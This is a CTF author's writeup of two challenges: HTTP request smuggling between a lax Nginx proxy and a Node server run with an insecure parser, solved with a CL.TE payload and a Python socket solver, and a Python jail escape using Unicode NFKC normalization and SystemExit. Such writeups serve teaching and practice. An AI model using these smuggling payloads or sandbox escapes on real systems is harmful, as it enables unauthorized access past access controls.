---
title: sknbCTF 2025 Author's Writeup 
date: 2025-11-27
layout: writeup
official: true
language: en
tags:
  - Web
  - Misc
---

I made some challenges for [sknbCTF 2025](https://ctftime.org/event/2947/). This article is author's official writeup.

# [web] ghost
>
> It's devouring HTTP meatloaf.

## Overview

The goal is access to `/flag` without `X-From-Proxy` header and get response.

Node server source code:

```js
const http = require('http');
const fs = require('fs');
const path = require('path');

const FLAG = process.env.FLAG || 'sknb{dummy}';

http.createServer((req, res) => {
  console.log(`${req.method} ${req.url}`);

  switch (req.url) {
    case '/flag':
      if (!req.headers['x-from-proxy']) {
        res.end(FLAG);
      } else {
        res.writeHead(403, { 'Content-Type': 'text/plain' });
        res.end('Forbidden');
      }
      return;
    
    case '/':
      res.end('Hello');
      return;

    default:
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('Not Found');
      return;
  }

}).listen(8080, () => console.log('Backend on :8080'));
```

Nginx configuration:

```
error_log /dev/stdout info;

events {
  worker_connections 1024;
}

http {
  server {
    listen 80;
    keepalive_timeout 5s;
    ignore_invalid_headers off;

    location / {
        proxy_pass http://app:8080;
        proxy_http_version 1.1;
        proxy_set_header Connection "";
        proxy_set_header X-From-Proxy true;
    }
  }
}
```

## Solution

This challenge uses HTTP request smuggling. In Nginx configuration, `ignore_invalid_headers` is set to off. In addition, when the Node server starts, `--insecure-http-parser` is set to Node (see the Dockerfile). They mean that "invalid" header is ignored by Nginx and accepted by Node server.
An "invalid" header is one whose name contains a space or a tab. For example:

```
Transfer-Encoding: chunked    # valid
Transfer-Encoding : chunked   # invalid
```

My intended solution is to use CL.TE vulnerability. Specifically, when an HTTP request contains a valid `Content-Length` header and an "invalid" `Transfer-Encoding` header is sent to this application, Nginx takes only `Content-Length` header but Node server takes `Transfer-Encoding` header.
If this payload is sent, Nginx interprets it as a single request: `POST /` but Node server interprets as two requests: `POST /` and `GET /flag`.

```
POST / HTTP/1.1
Host: vuln
Content-Length: 39
Transfer-Encoding : chunked

0

GET /flag HTTP/1.1
Host: vuln
```

Now you can send the smuggled request. However, you can get only one response. It is because Nginx interpreted one request so returned only one response. Another response: `GET /flag` is left in Nginx's response queue. To get this response, you obtain it by sending one additional request. When Nginx receives the request, the poisoned queue returns the response that was previously queued.

Final solver:

```py
#!/usr/bin/env python3
import sys, socket, textwrap, time

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

payload1 = textwrap.dedent(f"""\
    POST / HTTP/1.1
    Host: vuln
    Content-Length: 39
    Transfer-Encoding : chunked

    0

    GET /flag HTTP/1.1
    Host: vuln

    """).replace("\n", "\r\n").encode()

payload2 = textwrap.dedent(f"""\
    GET / HTTP/1.1
    Host: vuln
    Connection: close

    """).replace("\n", "\r\n").encode()


while True:
    with socket.create_connection((host, port)) as s:
        s.sendall(payload1) # Request Smuggling
        s.sendall(payload2) # Get Poisoned Response
        resp = b""
        while True:
            data = s.recv(1024)
            if not data:
                break
            resp += data
        decoded = resp.decode("latin1", errors="replace")
        if "sknb{" in decoded:
            flag = decoded.split("sknb{")[1].split("}")[0]
            print(f"sknb{{{flag}}}")
            break

    time.sleep(0.1)
```

# [misc] printgolf
>
> print(flag) in 8chars or less, without alphanumeric.

## Overview

Simple pyjail challenge. The goal is exec `print(flag)` or similar process in 8chars or less, without alphanumeric.

Source code:

```py
#!/usr/bin/env python3
import string
from collections.abc import __builtins__


flag = "sknb{dummy}"
title = """
            _       _              _  __        _           _ _                       
 _ __  _ __(_)_ __ | |_ __ _  ___ | |/ _|   ___| |__   __ _| | | ___ _ __   __ _  ___ 
| '_ \\| '__| | '_ \\| __/ _` |/ _ \\| | |_   / __| '_ \\ / _` | | |/ _ \\ '_ \\ / _` |/ _ \\
| |_) | |  | | | | | || (_| | (_) | |  _| | (__| | | | (_| | | |  __/ | | | (_| |  __/
| .__/|_|  |_|_| |_|\\__\\__, |\\___/|_|_|    \\___|_| |_|\__,_|_|_|\\___|_| |_|\\__, |\\___|
|_|                    |___/                                               |___/         
"""

print(title)
line = input(">>> ")


for c in line:
    if c in string.ascii_letters + string.digits:
        print("Invalid character")
        exit(0)

if len(line) > 8:
    print("Too long")
    exit(0)


bi = __builtins__
del bi["help"]

try:
    eval(line, {"__builtins__": bi}, locals())
except Exception:
    pass
except:
    raise Exception()
```

## Solution

In Python, `eval()` normalizes code using Unicode NFKC. For example, `ｐｒｉｎｔ` is converted to `print`. It is possible to escape first filter. In addition, second filter requires some techniques to reduce characters.

In this program, when `BaseException` is occurred, output the trace log. If the flag is in the cause of exception, flag should be contained in the log. However, `Exception` is passed.
Which exception can be used for this? As a result, you can use `exit()` or `quit()`. It occurs `SystemExit`, not included for `Exception` but included for `BaseException`.
Now you can make 10chars payload: `exit(flag)`, another technique is ligature. Under Unicode NFKC normalization, `ﬂ` is converted to `fl`. To use this, you can make 8chars payload.

Final payload: `ｅⅺｔ(ﬂａｇ)`
